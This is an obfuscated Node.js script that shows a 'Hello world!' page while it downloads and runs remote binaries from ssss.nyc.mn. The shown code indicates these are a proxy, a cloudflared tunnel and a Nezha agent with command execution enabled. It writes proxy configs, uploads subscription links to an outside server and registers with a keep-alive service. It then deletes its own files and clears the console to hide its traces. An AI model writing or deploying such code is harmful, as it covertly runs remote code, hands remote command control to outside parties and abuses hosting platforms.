const _0xd1f684=_0x4d7a;(function(_0x521b3e,_0x5b86c1){const _0x2758f0=_0x4d7a,_0x5b7ded=_0x521b3e();while(!![]){try{const _0x38d1a5=parseInt(_0x2758f0(0xff))/0x1*(parseInt(_0x2758f0(0x97))/0x2)+parseInt(_0x2758f0(0xbf))/0x3+-parseInt(_0x2758f0(0x9f))/0x4+parseInt(_0x2758f0(0x77))/0x5*(parseInt(_0x2758f0(0xc1))/0x6)+parseInt(_0x2758f0(0xd8))/0x7+parseInt(_0x2758f0(0xb6))/0x8+-parseInt(_0x2758f0(0x8e))/0x9*(parseInt(_0x2758f0(0xc9))/0xa);if(_0x38d1a5===_0x5b86c1)break;else _0x5b7ded['push'](_0x5b7ded['shift']());}catch(_0x27ebf7){_0x5b7ded['push'](_0x5b7ded['shift']());}}}(_0x55b6,0x20c19));const express=require(_0xd1f684(0x116)),app=express(),axios=require(_0xd1f684(0x104)),os=require('os'),fs=require('fs'),path=require(_0xd1f684(0x119)),{promisify}=require('util'),exec=promisify(require('child_process')[_0xd1f684(0xd2)]),{execSync}=require(_0xd1f684(0xa8)),UPLOAD_URL=process[_0xd1f684(0x120)][_0xd1f684(0xcc)]||'',PROJECT_URL=process[_0xd1f684(0x120)][_0xd1f684(0xb2)]||'',AUTO_ACCESS=process[_0xd1f684(0x120)]['AUTO_ACCESS']||![],FILE_PATH=process[_0xd1f684(0x120)][_0xd1f684(0x7a)]||_0xd1f684(0x9a),SUB_PATH=process[_0xd1f684(0x120)]['SUB_PATH']||'sub',PORT=process[_0xd1f684(0x120)][_0xd1f684(0x90)]||process[_0xd1f684(0x120)][_0xd1f684(0x89)]||0xbb8,UUID=process[_0xd1f684(0x120)][_0xd1f684(0xa1)]||_0xd1f684(0xd5),NEZHA_SERVER=process[_0xd1f684(0x120)][_0xd1f684(0xb5)]||'',NEZHA_PORT=process[_0xd1f684(0x120)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0xd1f684(0x120)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xd1f684(0x120)][_0xd1f684(0x82)]||'',ARGO_AUTH=process[_0xd1f684(0x120)]['ARGO_AUTH']||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0xd1f684(0x120)][_0xd1f684(0x9c)]||'cdns.doon.eu.org',CFPORT=process['env'][_0xd1f684(0xc8)]||0x1bb,NAME=process['env'][_0xd1f684(0x112)]||'';function _0x55b6(){const _0x20f31f=['all','boot.log','direct','\x22\x20>\x20/dev/null\x202>&1','8443','\x20>/dev/null\x202>&1','message','2083','pipe','chmod','295fFeGPA','xtls-rprx-vision','\x20-c\x20\x22','FILE_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','set','join','aarch64','tls','charAt','map','ARGO_DOMAIN','2096','tcp','text/plain;\x20charset=utf-8','/dev/null','none','includes','PORT','https://arm64.ssss.nyc.mn/agent','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','rm\x20-rf\x20','893493Enzugm','2053','SERVER_PORT','list.txt','http://ip-api.com/json/','127.0.0.1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','443','vmess','160528JygnvI','post','quic','./tmp','log','CFIP','utf-8','automatic\x20access\x20task\x20added\x20successfully','235592cxhUWO','Empowerment\x20success\x20for\x20','UUID','org','https://arm64.ssss.nyc.mn/bot','web\x20running\x20error:\x20','http','\x20-s\x20','arm','child_process','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/api/delete-nodes','substring','\x20>/dev/null\x202>&1\x20&','application/json','vless','http\x20server\x20is\x20running\x20on\x20port:','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Unknown','PROJECT_URL','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','amd','NEZHA_SERVER','34736jMegXo','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/config.json\x20>/dev/null\x202>&1\x20&','/vmess-argo','forEach','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readFileSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','316617aGfYnM','npm\x20running\x20error:\x20','1182ZlCMfy','Hello\x20world!','nohup\x20','\x20failed:\x20','unlinkSync','has','\x0a\x20\x20tunnel:\x20','CFPORT','10ntzPPk','Skipping\x20adding\x20automatic\x20access\x20task','\x20is\x20running','UPLOAD_URL','https://amd64.ssss.nyc.mn/web','pkill\x20-f\x20\x22[','length','\x0aclient_secret:\x20','readdirSync','exec','Download\x20','/vmess-argo?ed=2560','9afd1229-b893-40c1-84dd-51e7ce204913','App\x20is\x20running','data','72184wPOPjt','ArgoDomain:','/vless-argo','\x0a\x0atrojan://','push','unshift','statSync','status','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Error\x20downloading\x20files:','base64','https://amd64.ssss.nyc.mn/v1','/api/add-nodes','existsSync','split','get','&fp=firefox&type=ws&host=','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error','writeFileSync','match','\x20successfully','tunnel.yml','from','php\x20running\x20error:\x20','Empowerment\x20failed\x20for\x20','country_code','\x0a\x20\x20credentials-file:\x20','filter','mkdirSync','random','https://amd64.ssss.nyc.mn/bot','config.json','stringify','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','fileName','/trojan-argo','ARGO_DOMAIN:','isFile','2piZfRQ','config.yaml','block','abcdefghijklmnopqrstuvwxyz','\x20is\x20created','axios','send','/api/add-subscriptions','&path=%2Fvless-argo%3Fed%3D2560#','freedom','Content-Type','2087','\x0a\x20\x20\x20\x20','close','basename','countryCode','arm64','https://arm64.ssss.nyc.mn/web','response','NAME','catch','/tunnel.yml\x20run','Error\x20executing\x20command:\x20','express','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','floor','path','firefox','fileUrl','Subscription\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','toString','\x0avless://','env','Error\x20reading\x20boot.log:','Error\x20in\x20startserver:','win32','\x20-c\x20','platform'];_0x55b6=function(){return _0x20f31f;};return _0x55b6();}function _0x4d7a(_0x2efdf2,_0x3bf660){const _0x55b6e7=_0x55b6();return _0x4d7a=function(_0x4d7ad9,_0x515335){_0x4d7ad9=_0x4d7ad9-0x76;let _0xe3f5a3=_0x55b6e7[_0x4d7ad9];return _0xe3f5a3;},_0x4d7a(_0x2efdf2,_0x3bf660);}!fs[_0xd1f684(0xe5)](FILE_PATH)?(fs[_0xd1f684(0xf5)](FILE_PATH),console[_0xd1f684(0x9b)](FILE_PATH+_0xd1f684(0x103))):console[_0xd1f684(0x9b)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x45acfa=_0xd1f684,_0x1ade82=_0x45acfa(0x102);let _0xd08f9f='';for(let _0x5ee643=0x0;_0x5ee643<0x6;_0x5ee643++){_0xd08f9f+=_0x1ade82['charAt'](Math[_0x45acfa(0x118)](Math[_0x45acfa(0xf6)]()*_0x1ade82[_0x45acfa(0xcf)]));}return _0xd08f9f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xd1f684(0x7d)](FILE_PATH,npmName),phpPath=path[_0xd1f684(0x7d)](FILE_PATH,phpName),webPath=path[_0xd1f684(0x7d)](FILE_PATH,webName),botPath=path[_0xd1f684(0x7d)](FILE_PATH,botName),subPath=path[_0xd1f684(0x7d)](FILE_PATH,_0xd1f684(0x8b)),listPath=path[_0xd1f684(0x7d)](FILE_PATH,_0xd1f684(0x91)),bootLogPath=path[_0xd1f684(0x7d)](FILE_PATH,_0xd1f684(0x127)),configPath=path['join'](FILE_PATH,_0xd1f684(0xf8));function deleteNodes(){const _0x293da4=_0xd1f684;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x39efb5;try{_0x39efb5=fs[_0x293da4(0xbd)](subPath,_0x293da4(0x9d));}catch{return null;}const _0x415544=Buffer[_0x293da4(0xef)](_0x39efb5,_0x293da4(0xe2))[_0x293da4(0x11e)](_0x293da4(0x9d)),_0x1de710=_0x415544['split']('\x0a')[_0x293da4(0xf4)](_0x1756cd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1756cd));if(_0x1de710['length']===0x0)return;return axios[_0x293da4(0x98)](UPLOAD_URL+_0x293da4(0xaa),JSON[_0x293da4(0xf9)]({'nodes':_0x1de710}),{'headers':{'Content-Type':_0x293da4(0xad)}})['catch'](_0x14235f=>{return null;}),null;}catch(_0x4da8ae){return null;}}function cleanupOldFiles(){const _0x460313=_0xd1f684;try{const _0x377ce8=fs[_0x460313(0xd1)](FILE_PATH);_0x377ce8[_0x460313(0xbb)](_0x85d5b9=>{const _0x3cfa36=_0x460313,_0x498743=path['join'](FILE_PATH,_0x85d5b9);try{const _0x327830=fs[_0x3cfa36(0xde)](_0x498743);_0x327830[_0x3cfa36(0xfe)]()&&fs[_0x3cfa36(0xc5)](_0x498743);}catch(_0x2de862){}});}catch(_0x417cff){}}app[_0xd1f684(0xe7)]('/',function(_0x56fa68,_0x4962c9){const _0x4cc100=_0xd1f684;_0x4962c9[_0x4cc100(0x105)](_0x4cc100(0xc2));});async function generateConfig(){const _0x354b25=_0xd1f684,_0x7e341f={'log':{'access':'/dev/null','error':_0x354b25(0x86),'loglevel':_0x354b25(0x87)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x354b25(0x78)}],'decryption':_0x354b25(0x87),'fallbacks':[{'dest':0xbb9},{'path':_0x354b25(0xda),'dest':0xbba},{'path':_0x354b25(0xba),'dest':0xbbb},{'path':_0x354b25(0xfc),'dest':0xbbc}]},'streamSettings':{'network':_0x354b25(0x84)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x354b25(0xae),'settings':{'clients':[{'id':UUID}],'decryption':_0x354b25(0x87)},'streamSettings':{'network':_0x354b25(0x84),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x354b25(0xae),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x354b25(0xda)}},'sniffing':{'enabled':!![],'destOverride':[_0x354b25(0xa5),_0x354b25(0x7f),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x354b25(0x93),'protocol':_0x354b25(0x96),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x354b25(0xba)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x354b25(0x99)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x354b25(0x93),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x354b25(0x87),'wsSettings':{'path':_0x354b25(0xfc)}},'sniffing':{'enabled':!![],'destOverride':[_0x354b25(0xa5),_0x354b25(0x7f),_0x354b25(0x99)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x354b25(0x108),'tag':_0x354b25(0x128)},{'protocol':'blackhole','tag':_0x354b25(0x101)}]};fs[_0x354b25(0xeb)](path[_0x354b25(0x7d)](FILE_PATH,_0x354b25(0xf8)),JSON[_0x354b25(0xf9)](_0x7e341f,null,0x2));}function getSystemArchitecture(){const _0x25251d=_0xd1f684,_0x362606=os['arch']();return _0x362606==='arm'||_0x362606===_0x25251d(0x10f)||_0x362606===_0x25251d(0x7e)?_0x25251d(0xa7):_0x25251d(0xb4);}function downloadFile(_0xbb1d24,_0x57ef6b,_0x2d1611){const _0x36902c=_0xd1f684,_0x5c4a4d=_0xbb1d24;!fs[_0x36902c(0xe5)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1926e2=fs['createWriteStream'](_0x5c4a4d);axios({'method':_0x36902c(0xe7),'url':_0x57ef6b,'responseType':'stream'})['then'](_0x142753=>{const _0x1e1b3c=_0x36902c;_0x142753['data'][_0x1e1b3c(0x12e)](_0x1926e2),_0x1926e2['on']('finish',()=>{const _0x20e6e9=_0x1e1b3c;_0x1926e2[_0x20e6e9(0x10c)](),console[_0x20e6e9(0x9b)](_0x20e6e9(0xd3)+path['basename'](_0x5c4a4d)+_0x20e6e9(0xed)),_0x2d1611(null,_0x5c4a4d);}),_0x1926e2['on']('error',_0x2bb7e1=>{const _0x322163=_0x1e1b3c;fs['unlink'](_0x5c4a4d,()=>{});const _0xd17edb=_0x322163(0xd3)+path[_0x322163(0x10d)](_0x5c4a4d)+_0x322163(0xc4)+_0x2bb7e1[_0x322163(0x12c)];console['error'](_0xd17edb),_0x2d1611(_0xd17edb);});})['catch'](_0x459972=>{const _0x3710c6=_0x36902c,_0x7b9df1=_0x3710c6(0xd3)+path[_0x3710c6(0x10d)](_0x5c4a4d)+_0x3710c6(0xc4)+_0x459972['message'];console['error'](_0x7b9df1),_0x2d1611(_0x7b9df1);});}async function downloadFilesAndRun(){const _0x331aa5=_0xd1f684,_0x1f18df=getSystemArchitecture(),_0x381388=getFilesForArchitecture(_0x1f18df);if(_0x381388[_0x331aa5(0xcf)]===0x0){console[_0x331aa5(0x9b)](_0x331aa5(0x117));return;}const _0x4717d9=_0x381388[_0x331aa5(0x81)](_0x2119a9=>{return new Promise((_0x1a7f2b,_0x5d2b5c)=>{const _0x4a80e6=_0x4d7a;downloadFile(_0x2119a9[_0x4a80e6(0xfb)],_0x2119a9[_0x4a80e6(0x11b)],(_0x317487,_0x3379ee)=>{_0x317487?_0x5d2b5c(_0x317487):_0x1a7f2b(_0x3379ee);});});});try{await Promise[_0x331aa5(0x126)](_0x4717d9);}catch(_0x268079){console[_0x331aa5(0xea)](_0x331aa5(0xe1),_0x268079);return;}function _0x519ab6(_0x408361){const _0x5e068d=_0x331aa5,_0x1a621b=0x1fd;_0x408361[_0x5e068d(0xbb)](_0x451f5e=>{const _0x249443=_0x5e068d;fs[_0x249443(0xe5)](_0x451f5e)&&fs[_0x249443(0x76)](_0x451f5e,_0x1a621b,_0x564568=>{const _0x2d2035=_0x249443;_0x564568?console[_0x2d2035(0xea)](_0x2d2035(0xf1)+_0x451f5e+':\x20'+_0x564568):console[_0x2d2035(0x9b)](_0x2d2035(0xa0)+_0x451f5e+':\x20'+_0x1a621b[_0x2d2035(0x11e)](0x8));});});}const _0x3432ae=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x519ab6(_0x3432ae);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31a351=NEZHA_SERVER[_0x331aa5(0x88)](':')?NEZHA_SERVER[_0x331aa5(0xe6)](':')['pop']():'',_0x3586ba=new Set([_0x331aa5(0x95),_0x331aa5(0x12a),'2096',_0x331aa5(0x10a),_0x331aa5(0x12d),_0x331aa5(0x8f)]),_0x116a35=_0x3586ba[_0x331aa5(0xc6)](_0x31a351)?'true':'false',_0x506234=_0x331aa5(0xd0)+NEZHA_KEY+_0x331aa5(0xb3)+NEZHA_SERVER+_0x331aa5(0xe9)+_0x116a35+_0x331aa5(0x7b)+UUID;fs[_0x331aa5(0xeb)](path['join'](FILE_PATH,_0x331aa5(0x100)),_0x506234);const _0x2329b8=_0x331aa5(0xc3)+phpPath+_0x331aa5(0x79)+FILE_PATH+_0x331aa5(0xe0);try{await exec(_0x2329b8),console['log'](phpName+_0x331aa5(0xcb)),await new Promise(_0x4b1dd2=>setTimeout(_0x4b1dd2,0x3e8));}catch(_0xc38363){console[_0x331aa5(0xea)](_0x331aa5(0xf0)+_0xc38363);}}else{let _0x372dbe='';const _0x1c60a3=[_0x331aa5(0x95),_0x331aa5(0x12a),_0x331aa5(0x83),_0x331aa5(0x10a),_0x331aa5(0x12d),_0x331aa5(0x8f)];_0x1c60a3[_0x331aa5(0x88)](NEZHA_PORT)&&(_0x372dbe='--tls');const _0x427817=_0x331aa5(0xc3)+npmPath+_0x331aa5(0xa6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x372dbe+_0x331aa5(0xbc);try{await exec(_0x427817),console['log'](npmName+_0x331aa5(0xcb)),await new Promise(_0x3829c8=>setTimeout(_0x3829c8,0x3e8));}catch(_0x12ab74){console['error'](_0x331aa5(0xc0)+_0x12ab74);}}}else console[_0x331aa5(0x9b)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3094ec=_0x331aa5(0xc3)+webPath+_0x331aa5(0x124)+FILE_PATH+_0x331aa5(0xb9);try{await exec(_0x3094ec),console[_0x331aa5(0x9b)](webName+_0x331aa5(0xcb)),await new Promise(_0x1d8ba9=>setTimeout(_0x1d8ba9,0x3e8));}catch(_0x3cd71e){console[_0x331aa5(0xea)](_0x331aa5(0xa4)+_0x3cd71e);}if(fs[_0x331aa5(0xe5)](botPath)){let _0x213c73;if(ARGO_AUTH[_0x331aa5(0xec)](/^[A-Z0-9a-z=]{120,250}$/))_0x213c73=_0x331aa5(0x8c)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x213c73=_0x331aa5(0xb0)+FILE_PATH+_0x331aa5(0x114):_0x213c73=_0x331aa5(0xb8)+FILE_PATH+_0x331aa5(0x11d)+ARGO_PORT;try{await exec(_0x331aa5(0xc3)+botPath+'\x20'+_0x213c73+_0x331aa5(0xac)),console[_0x331aa5(0x9b)](botName+_0x331aa5(0xcb)),await new Promise(_0x5e5a21=>setTimeout(_0x5e5a21,0x7d0));}catch(_0xaebb6f){console[_0x331aa5(0xea)](_0x331aa5(0x115)+_0xaebb6f);}}await new Promise(_0x640e6f=>setTimeout(_0x640e6f,0x1388));}function getFilesForArchitecture(_0x46f416){const _0x5b975c=_0xd1f684;let _0x145dc6;_0x46f416==='arm'?_0x145dc6=[{'fileName':webPath,'fileUrl':_0x5b975c(0x110)},{'fileName':botPath,'fileUrl':_0x5b975c(0xa3)}]:_0x145dc6=[{'fileName':webPath,'fileUrl':_0x5b975c(0xcd)},{'fileName':botPath,'fileUrl':_0x5b975c(0xf7)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x45746b=_0x46f416===_0x5b975c(0xa7)?_0x5b975c(0x8a):'https://amd64.ssss.nyc.mn/agent';_0x145dc6[_0x5b975c(0xdd)]({'fileName':npmPath,'fileUrl':_0x45746b});}else{const _0x522477=_0x46f416===_0x5b975c(0xa7)?'https://arm64.ssss.nyc.mn/v1':_0x5b975c(0xe3);_0x145dc6['unshift']({'fileName':phpPath,'fileUrl':_0x522477});}}return _0x145dc6;}function argoType(){const _0xa7f400=_0xd1f684;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xa7f400(0x9b)](_0xa7f400(0x94));return;}if(ARGO_AUTH[_0xa7f400(0x88)]('TunnelSecret')){fs['writeFileSync'](path[_0xa7f400(0x7d)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x309cf3=_0xa7f400(0xc7)+ARGO_AUTH['split']('\x22')[0xb]+_0xa7f400(0xf3)+path[_0xa7f400(0x7d)](FILE_PATH,'tunnel.json')+_0xa7f400(0xbe)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0xa7f400(0x7d)](FILE_PATH,_0xa7f400(0xee)),_0x309cf3);}else console[_0xa7f400(0x9b)](_0xa7f400(0xa9));}async function extractDomains(){const _0x58efa3=_0xd1f684;let _0x288816;if(ARGO_AUTH&&ARGO_DOMAIN)_0x288816=ARGO_DOMAIN,console[_0x58efa3(0x9b)](_0x58efa3(0xfd),_0x288816),await _0x3aadf4(_0x288816);else try{const _0x1b6c52=fs[_0x58efa3(0xbd)](path[_0x58efa3(0x7d)](FILE_PATH,_0x58efa3(0x127)),_0x58efa3(0x9d)),_0x5867ed=_0x1b6c52[_0x58efa3(0xe6)]('\x0a'),_0x28070e=[];_0x5867ed['forEach'](_0x11a331=>{const _0x2c44bf=_0x58efa3,_0x3e9abf=_0x11a331[_0x2c44bf(0xec)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3e9abf){const _0x202908=_0x3e9abf[0x1];_0x28070e[_0x2c44bf(0xdc)](_0x202908);}});if(_0x28070e[_0x58efa3(0xcf)]>0x0)_0x288816=_0x28070e[0x0],console[_0x58efa3(0x9b)](_0x58efa3(0xd9),_0x288816),await _0x3aadf4(_0x288816);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x58efa3(0xc5)](path[_0x58efa3(0x7d)](FILE_PATH,'boot.log'));async function _0x4b5e2d(){const _0x47ea25=_0x58efa3;try{process[_0x47ea25(0x125)]===_0x47ea25(0x123)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x47ea25(0xce)+botName[_0x47ea25(0x80)](0x0)+']'+botName[_0x47ea25(0xab)](0x1)+_0x47ea25(0x129));}catch(_0x1c0066){}}_0x4b5e2d(),await new Promise(_0x3e14b9=>setTimeout(_0x3e14b9,0xbb8));const _0x3f3193=_0x58efa3(0xb8)+FILE_PATH+_0x58efa3(0x11d)+ARGO_PORT;try{await exec(_0x58efa3(0xc3)+botPath+'\x20'+_0x3f3193+_0x58efa3(0xac)),console[_0x58efa3(0x9b)](botName+_0x58efa3(0xcb)),await new Promise(_0x25912c=>setTimeout(_0x25912c,0xbb8)),await extractDomains();}catch(_0x3d7ecf){console[_0x58efa3(0xea)](_0x58efa3(0x115)+_0x3d7ecf);}}}catch(_0xd934a1){console['error'](_0x58efa3(0x121),_0xd934a1);}async function _0x10ef53(){const _0x3a3499=_0x58efa3;try{const _0x368145=await axios[_0x3a3499(0xe7)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x368145['data']&&_0x368145[_0x3a3499(0xd7)][_0x3a3499(0xf2)]&&_0x368145['data'][_0x3a3499(0xa2)])return _0x368145[_0x3a3499(0xd7)]['country_code']+'_'+_0x368145[_0x3a3499(0xd7)][_0x3a3499(0xa2)];}catch(_0x2d038b){try{const _0x1a6716=await axios[_0x3a3499(0xe7)](_0x3a3499(0x92),{'timeout':0xbb8});if(_0x1a6716[_0x3a3499(0xd7)]&&_0x1a6716[_0x3a3499(0xd7)][_0x3a3499(0xdf)]==='success'&&_0x1a6716['data'][_0x3a3499(0x10e)]&&_0x1a6716[_0x3a3499(0xd7)][_0x3a3499(0xa2)])return _0x1a6716[_0x3a3499(0xd7)][_0x3a3499(0x10e)]+'_'+_0x1a6716[_0x3a3499(0xd7)][_0x3a3499(0xa2)];}catch(_0x14816c){}}return _0x3a3499(0xb1);}async function _0x3aadf4(_0xe40113){const _0x2672a1=await _0x10ef53(),_0xa2543d=NAME?NAME+'-'+_0x2672a1:_0x2672a1;return new Promise(_0x320ad8=>{setTimeout(()=>{const _0x18925a=_0x4d7a,_0x25f909={'v':'2','ps':''+_0xa2543d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x18925a(0x87),'net':'ws','type':'none','host':_0xe40113,'path':_0x18925a(0xd4),'tls':_0x18925a(0x7f),'sni':_0xe40113,'alpn':'','fp':_0x18925a(0x11a)},_0x4eb5c5=_0x18925a(0x11f)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xe40113+_0x18925a(0xe8)+_0xe40113+_0x18925a(0x107)+_0xa2543d+'\x0a\x0avmess://'+Buffer[_0x18925a(0xef)](JSON['stringify'](_0x25f909))['toString']('base64')+_0x18925a(0xdb)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xe40113+'&fp=firefox&type=ws&host='+_0xe40113+_0x18925a(0xb7)+_0xa2543d+_0x18925a(0x10b);console[_0x18925a(0x9b)](Buffer[_0x18925a(0xef)](_0x4eb5c5)[_0x18925a(0x11e)]('base64')),fs[_0x18925a(0xeb)](subPath,Buffer['from'](_0x4eb5c5)[_0x18925a(0x11e)](_0x18925a(0xe2))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x18925a(0xe7)]('/'+SUB_PATH,(_0x2d6d59,_0x358512)=>{const _0x55f82a=_0x18925a,_0x41eabb=Buffer[_0x55f82a(0xef)](_0x4eb5c5)[_0x55f82a(0x11e)](_0x55f82a(0xe2));_0x358512[_0x55f82a(0x7c)](_0x55f82a(0x109),_0x55f82a(0x85)),_0x358512[_0x55f82a(0x105)](_0x41eabb);}),_0x320ad8(_0x4eb5c5);},0x7d0);});}}async function uploadNodes(){const _0x196dd5=_0xd1f684;if(UPLOAD_URL&&PROJECT_URL){const _0x159ee4=PROJECT_URL+'/'+SUB_PATH,_0x30f8b6={'subscription':[_0x159ee4]};try{const _0x122d9c=await axios[_0x196dd5(0x98)](UPLOAD_URL+_0x196dd5(0x106),_0x30f8b6,{'headers':{'Content-Type':_0x196dd5(0xad)}});return _0x122d9c&&_0x122d9c[_0x196dd5(0xdf)]===0xc8?(console[_0x196dd5(0x9b)](_0x196dd5(0x11c)),_0x122d9c):null;}catch(_0xf33831){if(_0xf33831[_0x196dd5(0x111)]){if(_0xf33831[_0x196dd5(0x111)][_0x196dd5(0xdf)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x27cde4=fs[_0x196dd5(0xbd)](listPath,_0x196dd5(0x9d)),_0x37a42a=_0x27cde4[_0x196dd5(0xe6)]('\x0a')[_0x196dd5(0xf4)](_0x24f972=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x24f972));if(_0x37a42a['length']===0x0)return;const _0x2ec8b3=JSON[_0x196dd5(0xf9)]({'nodes':_0x37a42a});try{const _0xae9945=await axios[_0x196dd5(0x98)](UPLOAD_URL+_0x196dd5(0xe4),_0x2ec8b3,{'headers':{'Content-Type':_0x196dd5(0xad)}});return _0xae9945&&_0xae9945[_0x196dd5(0xdf)]===0xc8?(console[_0x196dd5(0x9b)]('Nodes\x20uploaded\x20successfully'),_0xae9945):null;}catch(_0x3aa899){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4b4e50=_0x4d7a,_0x490403=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x490403['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x490403['push'](phpPath);process[_0x4b4e50(0x125)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x490403[_0x4b4e50(0x7d)]('\x20')+'\x20>\x20nul\x202>&1',_0x9af713=>{const _0x3bc6ac=_0x4b4e50;console['clear'](),console['log'](_0x3bc6ac(0xd6)),console[_0x3bc6ac(0x9b)](_0x3bc6ac(0xfa));}):exec(_0x4b4e50(0x8d)+_0x490403[_0x4b4e50(0x7d)]('\x20')+_0x4b4e50(0x12b),_0x373f0f=>{const _0x269277=_0x4b4e50;console['clear'](),console[_0x269277(0x9b)]('App\x20is\x20running'),console[_0x269277(0x9b)](_0x269277(0xfa));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2790f9=_0xd1f684;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2790f9(0x9b)](_0x2790f9(0xca));return;}try{const _0x5c6087=await axios[_0x2790f9(0x98)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2790f9(0xad)}});return console['log'](_0x2790f9(0x9e)),_0x5c6087;}catch(_0x2e1883){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2e1883[_0x2790f9(0x12c)]),null;}}async function startserver(){const _0x2a82ad=_0xd1f684;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x11081f){console[_0x2a82ad(0xea)](_0x2a82ad(0x122),_0x11081f);}}startserver()[_0xd1f684(0x113)](_0x1f4908=>{const _0x5cc0ee=_0xd1f684;console[_0x5cc0ee(0xea)]('Unhandled\x20error\x20in\x20startserver:',_0x1f4908);}),app['listen'](PORT,()=>console[_0xd1f684(0x9b)](_0xd1f684(0xaf)+PORT+'!'));
